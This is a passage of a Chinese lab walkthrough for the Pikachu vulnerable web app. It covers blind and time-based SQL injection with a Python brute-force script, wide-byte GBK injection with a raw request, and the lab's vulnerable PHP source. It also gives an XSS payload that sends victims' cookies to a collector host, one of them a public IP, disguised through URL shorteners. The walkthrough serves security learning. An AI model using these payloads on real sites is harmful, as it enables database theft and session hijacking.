class="built_in">len</span>(guess)):</span><br><span class="line">            x = guess[j:j + <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># print(x, end=&#x27;&#x27;)</span></span><br><span class="line">            values = <span class="string">&quot;lucy&#x27; and substring(&#123;grammar&#125;,&#123;num&#125;,1)=&#x27;&#123;guess&#125;&#x27;#&quot;</span>.<span class="built_in">format</span>(grammar=data, num=i,</span><br><span class="line">                                                                                guess=x)</span><br><span class="line">            flag = query(values)</span><br><span class="line">            <span class="comment"># print(flag)</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(x, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 不先获取数据长度的后果，继续做值爆破完成判断</span></span><br><span class="line">        <span class="comment"># print(&#x27;-&#x27; + str(isnum),end=&#x27;&#x27;)</span></span><br><span class="line">        <span class="comment"># print(bool(1-flag),end=&#x27;&#x27;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bool</span>(<span class="number">1</span> - flag):</span><br><span class="line">            <span class="comment"># print(&#x27;ni-&#x27; + x + &#x27;-ni&#x27; + str(i))</span></span><br><span class="line">            isnum = isnum + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isnum == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># flag = False</span></span><br><span class="line">        <span class="comment"># print()</span></span><br><span class="line">        <span class="comment"># print(values)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 弄个请求函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">values</span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: values,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers, params=params);</span><br><span class="line">    query_text = response.text</span><br><span class="line">    <span class="comment"># print(query_text)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 使用xpath</span></span><br><span class="line">    <span class="comment"># tree = etree.HTML(query_text)</span></span><br><span class="line">    <span class="comment"># tree_str = tree.xpath(&#x27;//div/p[@class=&quot;notice&quot;]/text()&#x27;)</span></span><br><span class="line">    <span class="comment"># print(tree_str[0])</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 使用正则</span></span><br><span class="line">    ex = <span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;(.*?) uid:.*?&lt;/p&gt;&quot;</span></span><br><span class="line">    judge = re.findall(ex, query_text, re.S)</span><br><span class="line">    <span class="comment"># print(judge)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(judge) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># print(values)</span></span><br><span class="line">    <span class="comment"># query()</span></span><br><span class="line">    <span class="comment"># parameter()</span></span><br><span class="line">    loop()</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;\n请输入任意键退出！！！&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 任意输入看提示；输入存在账户，都是提示：</span><br><span class="line">i don<span class="comment">&#x27;t care who you are!</span></span><br><span class="line"># 不在乎我是谁？</span><br><span class="line"># 根据关卡名判断，与时间有关！F12分别看下响应时间，多次测试得到：<span class="number">36</span>ms和<span class="number">31</span>ms</span><br><span class="line"># 注：正确账户响应时间更长</span><br><span class="line"># 试了下其他操作，有些命令执行时间过短，难以判断，调用 <span class="keyword">if</span> 语句和 sleep() 函数进行延时判断：</span><br><span class="line">lucy<span class="comment">&#x27; and if(substring(database(),1,1)=&#x27;p&#x27;,sleep(6),null)#</span></span><br><span class="line"># 语句解析：当 <span class="keyword">if</span> 语句为 TRUE，则延时<span class="number">6</span>s，反之时间很小，多以ms为单位</span><br><span class="line">#</span><br><span class="line"># 其他payload</span><br><span class="line"># 查看当前数据库名长度</span><br><span class="line">lucy<span class="comment">&#x27; and if(length(database())=7, sleep(6), null)#</span></span><br><span class="line"># 查看所有数据库名成组后长度</span><br><span class="line">lucy<span class="comment">&#x27; and if((SELECT length(GROUP_CONCAT(DISTINCT TABLE_SCHEMA)) FROM information_schema.TABLES)=61,sleep(6),null)#</span></span><br><span class="line"># 想着试下 union 关键字，额，没显示呀</span><br><span class="line"># 搞下报错，……搞不出，好吧，太菜了</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还是得分析下源码滴</span></span><br><span class="line"><span class="comment"># submit存在，对输入进行判空</span></span><br><span class="line"><span class="comment"># mysqli_query() 函数执行某个针对数据库的查询，返回TRUE or FALSE</span></span><br><span class="line"><span class="comment"># $result 存在且为单行记录</span></span><br><span class="line"><span class="comment"># 成功与失败的返回是一致的，如靶场作者所说，更加不好判断了</span></span><br><span class="line"><span class="comment"># SO，需要我们根据响应时间进行判断，分析源码可以看到 $result 但凡有一项不满足直接提示；若全满足，则进行其他操作，增加响应时间</span></span><br><span class="line"></span><br><span class="line">$link=connect();</span><br><span class="line"></span><br><span class="line">$html=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;name&#x27;</span>]!=null)&#123;</span><br><span class="line">    $name=$_GET[<span class="string">&#x27;name&#x27;</span>];//这里没有做任何处理，直接拼到select里面去了</span><br><span class="line">    $query=<span class="string">&quot;select id,email from member where username=&#x27;$name&#x27;&quot;</span>;//这里的变量是字符型，需要考虑闭合</span><br><span class="line">    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述</span><br><span class="line">//     $result=execute($link, $query);</span><br><span class="line">//    $html.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($result &amp;&amp; mysqli_num_rows($result)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>($data=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            $<span class="built_in">id</span>=$data[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            $email=$data[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断</span><br><span class="line">            $html.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        $html.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><ul><li>原理：利用MySQL特性，即MySQL使用GBK编码时，认为两个字符为一个汉字（前一个ASCII码要大于128，进入汉字范围）。</li><li>宽字节注入 方法：单引号逃逸<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES <span class="comment">&#x27;gbk&#x27;</span></span><br><span class="line">#</span><br><span class="line"># 以上<span class="number">1</span>行等价与如下<span class="number">3</span>行，该数据的写入导致宽字节注入的出现</span><br><span class="line">#</span><br><span class="line">SET character_set_connection=<span class="comment">&#x27;gbk&#x27;</span></span><br><span class="line">SET character_set_results=<span class="comment">&#x27;gbk&#x27;</span></span><br><span class="line">SET character_set_client=gb</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 哒哒哒，骑上我心爱的小摩托！</span><br><span class="line"># payload：<span class="number">1</span>%df%<span class="number">27</span>+<span class="keyword">or</span>+<span class="number">1</span>=<span class="number">1#</span></span><br><span class="line"># 咋咧，直接写入不存在？hacker 插件写入也不存在</span><br><span class="line"># burp，我们走！（请求包放下一个代码块）什么原理，居然可以</span><br><span class="line"># 有点明白，不知道对不对，即编码次数与解码次数不一致导致无法正确识别</span><br><span class="line"># bp抓包可以看到，<span class="number">1</span>%df%<span class="number">27</span>+<span class="keyword">or</span>+<span class="number">1</span>=<span class="number">1#</span> 被再次编码：<span class="number">1</span>%<span class="number">25</span>df%<span class="number">2527</span>%<span class="number">2</span>Bor%<span class="number">2</span>B1%<span class="number">3D1</span>%<span class="number">23</span></span><br><span class="line"># 问题分析：上边的单引号已经使用%<span class="number">27</span>进行编码，当浏览器上传时再次编码，源码文件中再次进行转义，但此时 escape() 函数已经无法识别出单引号了；即便语句换成 <span class="number">1</span>%df<span class="comment">&#x27; or 1=1# 也因浏览器的上传编码导致单引号变成%27，最后 escape() 函数也不需要进行转义处理。</span></span><br><span class="line"># 更改下，使用hacker插件写入 <span class="number">1</span>%df<span class="comment">&#x27; or 1=1# 作为 name 值，可以</span></span><br><span class="line"># </span><br><span class="line">#</span><br><span class="line"># 其他payload</span><br><span class="line"># 联合语句拿所有数据库名</span><br><span class="line"># <span class="keyword">name</span>=<span class="number">1</span>%DF<span class="comment">&#x27; union SELECT 1,GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES#&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"># 拿当前数据库名</span><br><span class="line"># <span class="keyword">name</span>=<span class="number">1</span>%DF<span class="comment">&#x27; union SELECT 1,database()#&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"># </span><br><span class="line">#</span><br><span class="line"># 就使用数据库测试时发现，有个奇怪的，根据源码拼接转义后字符串：<span class="number">1</span>�\<span class="comment">&#x27; or 1=1# ，即</span></span><br><span class="line"># select id,email from member where username=<span class="comment">&#x27;1�\&#x27; or 1=1# </span></span><br><span class="line"># 报错：&gt; <span class="number">1064</span> - You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;1�\&#x27; or 1=1#&#x27; at line 1</span></span><br><span class="line"># 少个单引号？什么操作，源码里还有什么操作滴？瞅了一眼，就是直接拼接呀，加个输出（源码解析里看原因）：&lt;?php echo $query;?&gt;</span><br><span class="line"># select id,email from member where username=<span class="comment">&#x27;1�\&#x27; or 1=1#&#x27; </span></span><br><span class="line"># 自提供的单引号倒是构成了闭合，但没数据呀</span><br><span class="line"># 再看看，看到没：execute($link,$set); ，设置客户端来源编码为 GBK ，</span><br><span class="line"># 当再执行 mysqli_query($link, $query); 时，因为 SQL 语句中的 <span class="comment">&#x27;�&#x27; 转成　ASCII　码为253，大于128，进入汉字范围，则需要与后一个字符进行组合形成一个汉字（两个字符组成一个汉字），因此，我们的单引号就逃逸了，SQL语句能够形成闭合，造成宽字节注入的实现，这就是宽字节注入的所有实现过程。</span></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /vul/sqli/sqli_widebyte.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">135.130</span>:<span class="number">49154</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span>.<span class="number">135.130</span>:<span class="number">49154</span>/vul/sqli/sqli_widebyte.php</span><br><span class="line">Cookie: PHPSESSID=<span class="number">60</span>trut6t3ruj65dnabae8a07hp</span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line">Connection: <span class="keyword">close</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">name</span>=<span class="number">1</span>%df%<span class="number">27</span>+<span class="keyword">or</span>+<span class="number">1</span>=<span class="number">1#</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"># 源码分析</span><br><span class="line"># </span><br><span class="line"># 调用escape() 对输入内容（$_POST[<span class="comment">&#x27;name&#x27;]）进行重新编码</span></span><br><span class="line"># escape() 函数，不会对 ASCII 字母和数字进行编码，也不会对某些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被十六进制的转义序列替换。</span><br><span class="line"># 然后，就直接拼入SQL语句中</span><br><span class="line"># 调用 execute() 函数，将 <span class="string">&quot;set character_set_client=gbk&quot;</span> 写入数据库，更改客户端来源编码</span><br><span class="line"># 使用 mysqli_query() 函数执行查询操作，根据返回结果执行网页输出</span><br><span class="line">#</span><br><span class="line"># 写入 %df%<span class="number">27</span> 时进行分析</span><br><span class="line"># %<span class="number">27</span> 为单引号的URL编码</span><br><span class="line"># %df 解码为 �，不知道是个啥，不用管，仅为与另一个字符组合构成一个汉字，造成单引号逃逸</span><br><span class="line"># 当执行 escape($link,$_POST[<span class="comment">&#x27;name&#x27;]) 时，被转义编码为：%25df%2527</span></span><br><span class="line"># 呃……这是以js形式运行的 escape() 函数，他是编码了，所以我还是弄不出它转义效果，理解不是很好</span><br><span class="line"># 还是对源码下手了，在 &lt;?php echo $html;?&gt; 上一行添加了 &lt;?php echo $<span class="keyword">name</span>;?&gt; 把escape() 运行后结果输出，还真是输入框输入：<span class="number">1</span><span class="comment">&#x27; ，输出：1\&#x27; 。的确是将单引号进行转义的，而不是进行编码输出</span></span><br><span class="line"># 试下：<span class="number">1</span>%df<span class="comment">&#x27; or 1=1# ，这个，直接输入输入框中不行，需要用到docker插件写入：1�\&#x27; or 1=1# </span></span><br><span class="line"># F12 比对post参数信息，确实是浏览器再次编码问题导致程序解出我们的预期，写一下吧</span><br><span class="line"># 浏览器直接写入显示：<span class="keyword">name</span>=<span class="number">1</span>%<span class="number">25</span>df%<span class="number">27</span>+<span class="keyword">or</span>+<span class="number">1</span>%<span class="number">3D1</span>%<span class="number">23</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br><span class="line"># 插件写入显示：<span class="keyword">name</span>=<span class="number">1</span>%df<span class="comment">&#x27; or 1=1#&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br><span class="line"># 最后，当执行 mysqli_query($link, $query) 后，由于使用 SELECT 查询，成功则返回一个 mysqli_result 对象</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$link=connect();</span><br><span class="line"></span><br><span class="line">$html=<span class="comment">&#x27;&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="comment">&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;name&#x27;]!=null)&#123;</span></span><br><span class="line"></span><br><span class="line">    $<span class="keyword">name</span> = escape($link,$_POST[<span class="comment">&#x27;name&#x27;]);</span></span><br><span class="line">    $query=<span class="string">&quot;select id,email from member where username=&#x27;$name&#x27;&quot;</span>;//这里的变量是字符型，需要考虑闭合</span><br><span class="line">    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题</span><br><span class="line">    $set = <span class="string">&quot;set character_set_client=gbk&quot;</span>;</span><br><span class="line">    execute($link,$set);</span><br><span class="line"></span><br><span class="line">    //mysqi_query不打印错误描述</span><br><span class="line">    $result=mysqli_query($link, $query);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_num_rows($result) &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> ($<span class="keyword">data</span>=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            $id=$<span class="keyword">data</span>[<span class="comment">&#x27;id&#x27;];</span></span><br><span class="line">            $email=$<span class="keyword">data</span>[<span class="comment">&#x27;email&#x27;];</span></span><br><span class="line">            $html.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; </span></span><br><span class="line"><span class="string">your email is: &#123;$email&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 部分GBK 编码表</span><br><span class="line"></span><br><span class="line"><span class="symbol">99 </span>０ １ ２ ３ ４ ５ ６ ７ ８ ９ Ａ Ｂ Ｃ Ｄ Ｅ Ｆ</span><br><span class="line">４ 橜 橝 橞 機 橠 橢 橣 橤 橦 橧 橨 橩 橪 橫 橬 橭</span><br><span class="line">５ 橮 橯 橰 橲 橳 橴 橵 橶 橷 橸 橺 橻 橽 橾 橿 檁</span><br><span class="line">６ 檂 檃 檅 檆 檇 檈 檉 檊 檋 檌 檍 檏 檒 檓 檔 檕</span><br><span class="line">７ 檖 檘 檙 檚 檛 檜 檝 檞 檟 檡 檢 檣 檤 檥 檦</span><br><span class="line">８ 檧 檨 檪 檭 檮 檯 檰 檱 檲 檳 檴 檵 檶 檷 檸 檹</span><br><span class="line">９ 檺 檻 檼 檽 檾 檿 櫀 櫁 櫂 櫃 櫄 櫅 櫆 櫇 櫈 櫉</span><br><span class="line">Ａ 櫊 櫋 櫌 櫍 櫎 櫏 櫐 櫑 櫒 櫓 櫔 櫕 櫖 櫗 櫘 櫙</span><br><span class="line">Ｂ 櫚 櫛 櫜 櫝 櫞 櫟 櫠 櫡 櫢 櫣 櫤 櫥 櫦 櫧 櫨 櫩</span><br><span class="line">Ｃ 櫪 櫫 櫬 櫭 櫮 櫯 櫰 櫱 櫲 櫳 櫴 櫵 櫶 櫷 櫸 櫹</span><br><span class="line">Ｄ 櫺 櫻 櫼 櫽 櫾 櫿 欀 欁 欂 欃 欄 欅 欆 欇 欈 欉</span><br><span class="line">Ｅ 權 欋 欌 欍 欎 欏 欐 欑 欒 欓 欔 欕 欖 欗 欘 欙</span><br><span class="line">Ｆ 欚 欛 欜 欝 欞 欟 欥 欦 欨 欩 欪 欫 欬 欭 欮</span><br></pre></td></tr></table></figure></li></ul><h1 id="管理工具–XSS后台"><a href="#管理工具–XSS后台" class="headerlink" title="管理工具–XSS后台"></a>管理工具–XSS后台</h1><h2 id="cookie搜集"><a href="#cookie搜集" class="headerlink" title="cookie搜集"></a>cookie搜集</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 可以看下 /app/pkxss/xcookie/cookie.php 中内容，其中代码用于获取用户cookie</span><br><span class="line"># 以 xss 第一题为例</span><br><span class="line"># 构造输入盲打语句</span><br><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.135.132:49160/pkxss/xcookie/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br><span class="line"># 最后拼接，此处拿题1测试，KO</span><br><span class="line">http://192.168.135.132:49160/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.135.132%3A49160%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br><span class="line"># 这么长？一看就有问题，找个短链生成器缩短下，度娘是不会吝啬的</span><br><span class="line">https://bit.ly/3lEax4u</span><br><span class="line">#自己打自己肯定不好玩，那打本地发到远程服务上：</span><br><span class="line">http://192.168.135.130:49154/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F112.64.65.110%3A9002%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br><span class="line"># 对应短链：</span><br><span class="line">http://k8i.cn/wEBbU</span><br><span class="line"># 服务器对服务器的（不要问我哪来那么多服务器，佛法搜一下），只给短链：http://k8i.cn/FJcGr</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/xcookie/cookie.php 源码</span></span><br><span class="line"><span class="comment"># 通过 cookie 进行传参，因此需要把远程服务器上的脚本作为 cookie 值</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 分析下如下 URL 的运行机制：</span></span><br><span class="line">http:<span class="comment">//192.168.135.132:49160/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.135.132%3A49160%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 比较 http://192.168.135.130:49154/vul/xss/xss_reflected_get.php 源码可知，写入内容直接拼接后输出前端，即执行插入的脚本（message 值）。</span></span><br><span class="line"><span class="comment"># 通过 script 标签执行 js 脚本，具体：利用 document.location 方法访问其后的 URL，而在访问该 URL 时，需要先通过 document.cookie 方法拿到当前页面 cookie，才能继续执行。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 当执行完恶意代码后，攻击方获得 URL 访问时间和 cookie 等重要参数 </span></span><br><span class="line"><span class="comment"># 再进行 header() 和 Location 结合组成跳转页面的效果。</span></span><br><span class="line"><span class="comment"># header() 函数向客户端发送原始的 HTTP 报头。</span></span><br><span class="line"><span class="comment"># Location 类似 document.location 作用。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个是获取cookie的api页面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$ipaddress</span>=<span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) </span></span><br><span class="line"><span class="string">    values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ipaddress</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://192.168.135.132:49161/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 